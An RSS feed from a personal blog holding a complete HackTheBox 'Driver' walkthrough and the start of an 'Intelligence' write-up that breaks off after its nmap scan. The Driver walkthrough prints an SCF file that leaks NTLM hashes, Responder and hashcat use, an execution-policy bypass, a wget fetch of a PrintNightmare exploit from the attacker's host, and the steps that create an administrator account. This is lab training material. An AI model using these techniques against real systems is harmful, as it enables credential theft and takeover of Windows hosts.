<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Responder on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/responder/</link>
    <description>Recent content in Responder on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 25 Sep 2022 17:28:30 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/responder/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Driver</title>
      <link>https://fahmifj.github.io/hackthebox/driver/</link>
      <pubDate>Sun, 25 Sep 2022 17:28:30 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/driver/</guid>
      <description>Driver is also one of the machines listed in the HTB printer exploitation track. It starts with a website for updating Multi-Function Printer firmware, where it allows users to upload files to a file share. With no upload restriction, it is possible to drop off a malicious SCF file to steal the NTLM hash of anyone who tries to access the share where the file lives. The hash can be cracked to retrieve the user password and it allows me to set foothold on the machine via WinRM.</description>
      <content:encoded><![CDATA[<p>Driver is also one of the machines listed in the HTB printer exploitation track. It starts with a website for updating Multi-Function Printer firmware, where it allows users to upload files to a file share. With no upload restriction, it is possible to drop off a malicious SCF file to steal the NTLM hash of anyone who tries to access the share where the file lives. The hash can be cracked to retrieve the user password and it allows me to set foothold on the machine via WinRM.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Stealing NTLM hash</li>
<li>Printer spooler exploitation with PrintNightmare</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Responder</li>
<li>PrintNightmare exploit PoC</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Performing full TCP scan with <code>nmap</code> reveals 4 open ports: Web/HTTP on <code>80</code> , MS-RPC on <code>135</code> , SMB on <code>445</code>, and WinRM on <code>5985</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
</span></span><span class="line"><span class="cl">$ fscan 10.10.11.106 driver
</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.106 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p 80,135,445,5985 -sC -sV -oA nmap/all-tcp-ports-driver 10.10.11.106
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-18 16:25 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.106
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.049s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE      VERSION
</span></span><span class="line"><span class="cl">80/tcp   open  http         Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-auth: 
</span></span><span class="line"><span class="cl"><span class="p">|</span> HTTP/1.1 <span class="m">401</span> Unauthorized<span class="se">\x</span>0D
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Basic <span class="nv">realm</span><span class="o">=</span>MFP Firmware Update Center. Please enter password <span class="k">for</span> admin
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
</span></span><span class="line"><span class="cl">135/tcp  open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds Microsoft Windows <span class="m">7</span> - <span class="m">10</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl">5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">Service Info: Host: DRIVER<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-10-19T03:25:40
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: 2021-10-18T23:16:49
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 47.37 seconds
</span></span></code></pre></div><p>Based on the results, it seems the website on port 80 requires an authentication first.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>On SMB, anonymous login is not allowed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.11.106 
</span></span><span class="line"><span class="cl">session setup failed: NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div><h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Poking the website with curl returns a <code>401 Unauthorized</code> response.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
</span></span><span class="line"><span class="cl">$ curl -sv 10.10.11.106
</span></span><span class="line"><span class="cl">*   Trying 10.10.11.106:80...
</span></span><span class="line"><span class="cl">* Connected to 10.10.11.106 <span class="o">(</span>10.10.11.106<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c1">#0)</span>
</span></span><span class="line"><span class="cl">&gt; GET / HTTP/1.1
</span></span><span class="line"><span class="cl">&gt; Host: 10.10.11.106
</span></span><span class="line"><span class="cl">&gt; User-Agent: curl/7.74.0
</span></span><span class="line"><span class="cl">&gt; Accept: */*
</span></span><span class="line"><span class="cl">&gt; 
</span></span><span class="line"><span class="cl">* Mark bundle as not supporting multiuse
</span></span><span class="line"><span class="cl">&lt; HTTP/1.1 <span class="m">401</span> Unauthorized
</span></span><span class="line"><span class="cl">&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</span></span><span class="line"><span class="cl">&lt; Server: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl">&lt; X-Powered-By: PHP/7.3.25
</span></span><span class="line"><span class="cl">&lt; WWW-Authenticate: Basic <span class="nv">realm</span><span class="o">=</span><span class="s2">&#34;MFP Firmware Update Center. Please enter password for admin&#34;</span>
</span></span><span class="line"><span class="cl">&lt; Date: Tue, <span class="m">19</span> Oct <span class="m">2021</span> 04:03:53 GMT
</span></span><span class="line"><span class="cl">&lt; Content-Length: <span class="m">20</span>
</span></span><span class="line"><span class="cl">&lt; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host 10.10.11.106 left intact</span>
</span></span><span class="line"><span class="cl">Invalid Credentials%
</span></span></code></pre></div><p>Surprisingly, <code>admin:admin</code> is a valid credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
</span></span><span class="line"><span class="cl">$ curl -u <span class="s1">&#39;admin:admin&#39;</span> -I 10.10.11.106 
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">0</span>
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</span></span><span class="line"><span class="cl">Server: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl">X-Powered-By: PHP/7.3.25
</span></span><span class="line"><span class="cl">Date: Tue, <span class="m">19</span> Oct <span class="m">2021</span> 04:07:15 GMT
</span></span></code></pre></div><p>At the home page, it tells the purpose of this website. At the bottom, there&rsquo;s a potential username.</p>
<p><div class="img-container"><img src="imgs/image-20211019040903346.png" alt="image-20211019040903346"  /></div>
</p>
<p>On the Firmware Updates menu, there&rsquo;s an upload function.</p>
<p><div class="img-container"><img src="imgs/image-20211019041022554.png" alt="image-20211019041022554"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-tony">Shell as tony</h3>
<h4 id="stealing-ntlm-response">Stealing NTLM Response</h4>
<p>The firmware updates page actually gives a hint, where it states that the uploaded file will be put into a file share. The file will also be reviewed by a testing team.</p>
<p><div class="img-container"><img src="imgs/image-20211020034608009.png" alt="image-20211020034608009"  /></div>
</p>
<p>The idea here is to steal the NTLM hash of the testing team.</p>
<p>My first attempt was putting an exe file by assuming the team would do some interaction like clicking on the file after it gets uploaded on the share. But nothing come back to my listener</p>
<p>And then I found <a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/">this blog</a> and learned that an SCF (shell command file) can be used to trigger NTLM authentication without interaction with the file itself.</p>
<p>From here, I&rsquo;ll create an SCF file and upload it to the web. I&rsquo;ll start responder as well. Once the testing team visit the share folder, the explorer will try to resolve the network path looking for the icon.</p>
<p><code>iamf.scf</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[Shell]
</span></span><span class="line"><span class="cl">Command=2
</span></span><span class="line"><span class="cl">IconFile=\\10.10.14.11\iamf.ico
</span></span><span class="line"><span class="cl">[Taskbar]
</span></span><span class="line"><span class="cl">Command=ToggleDesktop
</span></span></code></pre></div><p>On my responder, it captures hash of user <code>tony</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ sudo responder -w -I tun0
</span></span><span class="line"><span class="cl">                                         __
</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.0.6.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 10.10.11.106
</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : DRIVER<span class="se">\t</span>ony
</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : tony::DRIVER:718de
</span></span></code></pre></div><h4 id="hash-crack">Hash crack</h4>
<p>The password can easily be cracked with <code>hashcat</code> and <code>rockyou.txt</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ hashcat -m <span class="m">5600</span> <span class="s1">&#39;tony::DRIVER:718de45096091894:2635472ECA8116616D85DF31C5271692:01...[SNIP]...&#39;</span> /c/tools/rockyou.txt --show
</span></span><span class="line"><span class="cl">tony::DRIVER:718de45096091894:2635472ECA8116616D85DF31C5271692:01...<span class="o">[</span>SNIP<span class="o">]</span>...:liltony
</span></span></code></pre></div><h4 id="winrm">WinRM</h4>
<p>The credentials can be used for remote access via WinRM</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.11.106 -u <span class="s1">&#39;tony&#39;</span> -p liltony
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; 
</span></span></code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>esktop&gt; dir
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                -------------         ------ ----
</span></span><span class="line"><span class="cl">-ar---       10/19/2021   5:40 PM             <span class="m">34</span> user.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>esktop&gt; gc user.txt
</span></span><span class="line"><span class="cl">f04c7b...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as--administrator">Shell as  Administrator</h3>
<h4 id="printnightmare">PrintNightmare</h4>
<p>I quickly check if the spooler service is running because the box is named &ldquo;Driver&rdquo; and the website is all about printers. And It&rsquo;s!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; Get-Service -name spooler
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Status   Name               DisplayName
</span></span><span class="line"><span class="cl">------   ----               -----------
</span></span><span class="line"><span class="cl">Running  spooler            Print Spooler
</span></span></code></pre></div><p>At that time, the PrintNightmare vulnerability (CVE-2021-1675) is still a fresh thing, so it&rsquo;s worth to try.</p>
<p>First, I&rsquo;ll grab the <a href="https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1">PowerShell exploit module</a> from my machine</p>
<pre tabindex="0"><code>*Evil-WinRM* PS C:\users\tony\downloads&gt; wget 10.10.14.11:8000/CVE-2021-1675.ps1 -UseBasicParsing -outfile CVE-2021-1675.ps1
</code></pre><p>But during import, it fails.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">File C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads<span class="se">\C</span>VE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID<span class="o">=</span>135170.
</span></span><span class="line"><span class="cl">At line:1 char:1
</span></span><span class="line"><span class="cl">+ Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
</span></span><span class="line"><span class="cl">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span></span><span class="line"><span class="cl">    + CategoryInfo          : SecurityError: <span class="o">(</span>:<span class="o">)</span> <span class="o">[</span>Import-Module<span class="o">]</span>, PSSecurityException
</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
</span></span></code></pre></div><p>That&rsquo;s because the shell are get restricted. Fortunately, it is possible to bypass this restriction with the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force<span class="p">;</span>
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Get-ExecutionPolicy
</span></span><span class="line"><span class="cl">Unrestricted
</span></span></code></pre></div><p>Now I can load the module and run the <code>Invoke-Nightmare</code> command</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Invoke-Nightmare
</span></span></code></pre></div><p>The command creates a default local admin user <code>adm1n</code> and password of <code>P@ssw0rd</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.11.106 -u <span class="s1">&#39;adm1n&#39;</span> -p<span class="s1">&#39;P@ssw0rd&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\D</span>esktop<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> root.txt
</span></span><span class="line"><span class="cl">c1de502...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Intelligence</title>
      <link>https://fahmifj.github.io/hackthebox/intelligence/</link>
      <pubDate>Mon, 19 Sep 2022 01:01:51 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/intelligence/</guid>
      <description>Intelligence brings some cool enumeration and exploitation techniques to own Active Directory. It starts by enumerating a website and launching a brute-force attack to obtain several PDF files. One of these files contains a default password for a new account. By spraying this password across a list of usernames extracted from the PDFs&amp;rsquo; metadata, a valid combination is discovered. In the file shares, there&amp;rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under intelligence.</description>
      <content:encoded><![CDATA[<p><a href="https://app.hackthebox.eu/machines/Intelligence/">Intelligence</a> brings some cool enumeration and exploitation techniques to own Active Directory. It starts by enumerating a website and  launching a brute-force attack to obtain several PDF files. One of these files contains a default password for a new account. By spraying this  password across a list of usernames extracted from the PDFs&rsquo; metadata, a valid combination is discovered. In the file shares, there&rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under <code>intelligence.htb</code>. By creating a new subdomain record, it is possible to capture the requester&rsquo;s hash, which can be cracked offline. Bloodhound analysis reveals that the user has permission to read the password of a GMSA  account, which has delegation rights to a service. These permissions can be exploited for privilege escalation to domain admin.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>User enumeration via file metadata</li>
<li>ADI DNS attack</li>
<li>AD</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Impacket</li>
<li>BloodHound</li>
<li>dnstool.py</li>
<li>gMSADumper.py</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Port scanning with <code>nmap</code> reveals a bunch of ports open. Some interesting ports to dig into here are 445, 389, and 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49423,49667,49691,49709,49714 -sC -sV -oA nmap/10-tcp-allport-script-intelligence 10.10.10.248
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-14 00:22 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.248
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Intelligence
</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2021-07-14 11:22:29Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:04+00:00<span class="p">;</span> +7h00m03s from scanner time.
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:03+00:00<span class="p">;</span> +7h00m02s from scanner time.
</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:04+00:00<span class="p">;</span> +7h00m03s from scanner time.
</span></span><span class="line"><span class="cl">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:03+00:00<span class="p">;</span> +7h00m02s from scanner time.
</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span class="line"><span class="cl">49423/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">49709/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49714/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-07-14T11:23:25
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
